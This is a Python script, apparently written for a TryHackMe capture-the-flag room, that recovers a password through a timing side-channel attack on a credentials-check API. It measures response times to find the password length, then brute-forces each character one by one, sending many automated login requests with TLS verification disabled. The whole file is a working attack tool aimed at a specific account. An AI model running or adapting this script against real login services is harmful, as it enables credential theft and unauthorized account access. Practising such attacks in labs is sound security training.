# script by Gemini and Claudi AI
# sript for tryhackme room BreachBlocker Unlocker https://tryhackme.com/room/sq4-aoc2025-32LoZ4zePK
# YouTube video walk through: https://youtu.be/xINJWj8zcrQ
# script using timing request to guess passowrd letter by letter.

import requests
import string
import urllib3
import statistics
import time
from collections import defaultdict

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ================= CONFIGURATION =================
URL = "https://10.48.173.35:8443/api/check-credentials"
EMAIL = "sbreachblocker@easterbunnies.thm"
CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;':,./<>?"
MAX_LENGTH_CHECK = 30
SAMPLES_LENGTH = 10      # More samples for length detection
SAMPLES_CHAR = 5         # Samples per character attempt
PERCENTILE = 75          # Use 75th percentile instead of mean (more robust)
# =================================================

session = requests.Session()  # Reuse session for cookies

def check_time(password, use_percentile=False, samples=1):
    """Returns timing for password attempt."""
    timings = []
    payload = {"email": EMAIL, "password": password}
    
    for _ in range(samples):
        try:
            start = time.perf_counter()
            response = session.post(URL, json=payload, verify=False, timeout=10)
            elapsed = time.perf_counter() - start
            timings.append(elapsed)
            time.sleep(0.05)  # Small delay between requests
        except Exception as e:
            print(f"\n[!] Error: {e}")
            return 0.0
    
    if use_percentile:
        return statistics.quantiles(timings, n=4)[2] if len(timings) > 1 else timings[0]  # 75th percentile
    return statistics.median(timings)  # Use median to handle outliers

def find_length_advanced():
    """Find password length using statistical analysis."""
    print(f"[*] Phase 1: Finding Password Length (scanning 1-{MAX_LENGTH_CHECK})...")
    
    length_data = defaultdict(list)
    
    # Collect multiple samples for each length
    for sample_round in range(SAMPLES_LENGTH):
        print(f"\n[*] Collection Round {sample_round + 1}/{SAMPLES_LENGTH}")
        for length in range(1, MAX_LENGTH_CHECK + 1):
            dummy_pass = "A" * length
            timing = check_time(dummy_pass, samples=1)
            length_data[length].append(timing)
            print(f"   Length {length}: {timing:.6f}s", end='\r')
    
    # Analyze collected data
    print("\n\n[*] Statistical Analysis:")
    length_stats = {}
    
    for length, timings in length_data.items():
        median_time = statistics.median(timings)
        mean_time = statistics.mean(timings)
        stdev = statistics.stdev(timings) if len(timings) > 1 else 0
        length_stats[length] = {
            'median': median_time,
            'mean': mean_time,
            'stdev': stdev,
            'max': max(timings)
        }
    
    # Sort by median time (most reliable metric)
    sorted_by_median = sorted(length_stats.items(), key=lambda x: x[1]['median'], reverse=True)
    
    print("\n[*] Top 5 Length Candidates (by median time):")
    for i, (length, stats) in enumerate(sorted_by_median[:5], 1):
        print(f"   {i}. Length {length:2d}: median={stats['median']:.6f}s, mean={stats['mean']:.6f}s, stdev={stats['stdev']:.6f}s")
    
    # Find the outlier - look for a jump in timing
    median_times = [stats['median'] for stats in length_stats.values()]
    overall_median = statistics.median(median_times)
    
    # The correct length should be significantly higher than median
    candidates = [(l, s['median']) for l, s in length_stats.items() if s['median'] > overall_median * 1.2]
    
    if candidates:
        best_length = max(candidates, key=lambda x: x[1])[0]
        print(f"\n[+] Detected Password Length: {best_length}")
        return best_length
    else:
        print("\n[!] Could not confidently detect length, using top candidate")
        return sorted_by_median[0][0]

def brute_char_position(known_password, total_length, position):
    """Brute force a single character position."""
    print(f"\n[*] Position {position + 1}/{total_length} (Current: '{known_password}')")
    
    char_timings = {}
    padding_length = total_length - len(known_password) - 1
    
    for char in CHARSET:
        attempt = known_password + char + ("A" * padding_length)
        
        # Take multiple samples
        timings = []
        for _ in range(SAMPLES_CHAR):
            t = check_time(attempt, samples=1)
            timings.append(t)
        
        # Use median for robustness
        median_time = statistics.median(timings)
        char_timings[char] = median_time
        
        print(f"   Testing '{char}': {median_time:.6f}s (best so far: '{max(char_timings, key=char_timings.get)}')", end='\r')
    
    # Find character with longest time
    best_char = max(char_timings, key=char_timings.get)
    best_time = char_timings[best_char]
    
    # Show top 3 candidates
    sorted_chars = sorted(char_timings.items(), key=lambda x: x[1], reverse=True)
    print(f"\n   Top 3: ", end='')
    for char, t in sorted_chars[:3]:
        print(f"'{char}':{t:.6f}s ", end='')
    
    return best_char

def verify_password(password):
    """Verify if the password is correct."""
    payload = {"email": EMAIL, "password": password}
    try:
        response = session.post(URL, json=payload, verify=False, timeout=10)
        data = response.json()
        return data.get('valid', False)
    except Exception as e:
        print(f"[!] Verification error: {e}")
        return False

def main():
    print("=" * 60)
    print("  TIMING ATTACK - CHARACTER-BY-CHARACTER PASSWORD RECOVERY")
    print("=" * 60)
    print(f"[*] Target: {EMAIL}")
    print(f"[*] Charset: {len(CHARSET)} characters")
    
    # Phase 1: Find Length
    pwd_length = find_length_advanced()
    
    # Phase 2: Brute Force Each Character
    print(f"\n{'=' * 60}")
    print(f"[*] Phase 2: Recovering {pwd_length} Characters")
    print(f"{'=' * 60}")
    
    recovered_password = ""
    
    for position in range(pwd_length):
        char = brute_char_position(recovered_password, pwd_length, position)
        recovered_password += char
        print(f"\n[+] Character {position + 1}: '{char}'")
        print(f"[+] Current Password: '{recovered_password}'")
    
    # Phase 3: Verification
    print(f"\n{'=' * 60}")
    print(f"[!!!] RECOVERED PASSWORD: {recovered_password}")
    print(f"{'=' * 60}")
    
    print("\n[*] Verifying password...")
    if verify_password(recovered_password):
        print("[+++] PASSWORD VERIFIED! SUCCESS!")
    else:
        print("[!] Password verification failed. Try adjusting parameters or re-running.")

if __name__ == "__main__":
    main()
